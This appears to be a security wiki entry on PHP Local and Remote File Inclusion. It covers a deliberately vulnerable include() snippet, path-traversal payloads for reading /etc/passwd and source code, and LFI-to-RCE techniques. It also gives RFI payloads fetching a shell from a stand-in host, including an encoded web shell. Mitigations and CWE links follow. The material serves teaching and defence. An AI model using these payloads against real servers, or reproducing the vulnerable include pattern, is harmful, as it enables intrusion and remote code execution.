# What is File Inclusion (LFI / RFI)?

File inclusion bugs happen when an app builds a file path from user input and includes it without validation. **Local File Inclusion (LFI)** reads files already on the server; **Remote File Inclusion (RFI)** pulls a file from a URL you control, which usually means code execution. Both come from the same root cause: untrusted input deciding which file the app loads.

## How it works

```php
// VULNERABLE
$page = $_GET['page'];
include($page . ".php");
```

Request `?page=../../../../etc/passwd%00` or `?page=http://attacker/shell.txt` and the server includes whatever you point at.

## LFI payloads

```text
../../../../etc/passwd
....//....//....//etc/passwd        # bypass naive ../ stripping
..%2f..%2f..%2fetc%2fpasswd          # URL-encoded
/etc/passwd%00                       # null byte (old PHP)
php://filter/convert.base64-encode/resource=index.php   # read source code
```

## LFI to RCE techniques

- **Log poisoning:** inject PHP into a log (User-Agent, SSH auth log), then include the log file
- **PHP wrappers:** `php://input`, `data://text/plain;base64,...`, `expect://`
- **Session files:** write code into `/var/lib/php/sessions/` and include it
- **/proc/self/environ** on older setups

## RFI payloads

```text
?page=http://attacker.tld/shell.txt
?page=ftp://attacker.tld/shell.txt
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
```

RFI requires `allow_url_include=On` (rare today), so LFI-to-RCE is the more common path.

## Test and tools

- Fuzz path parameters with [ffuf](../../Tools/ffuf.md) and LFI wordlists
- [Burp Suite](../../Tools/Burp%20Suite.md) Repeater for manual traversal
- `LFISuite` / PayloadsAllTheThings for wrapper payloads

## Mitigation

- Never build file paths from user input. Map input to a fixed allowlist of filenames.
- Use `basename()` and canonicalize paths; reject `../`, null bytes, and schemes.
- Disable `allow_url_include` and `allow_url_fopen` where possible.
- Store includable files outside any user-controlled directory.

## CWE

- CWE-98: PHP Remote File Inclusion
- CWE-22: Path Traversal (closely related - see [Directory Traversal](Directory%20Traversal.md))

## Deep dive

- [PortSwigger file path traversal labs](https://portswigger.net/web-security/file-path-traversal)
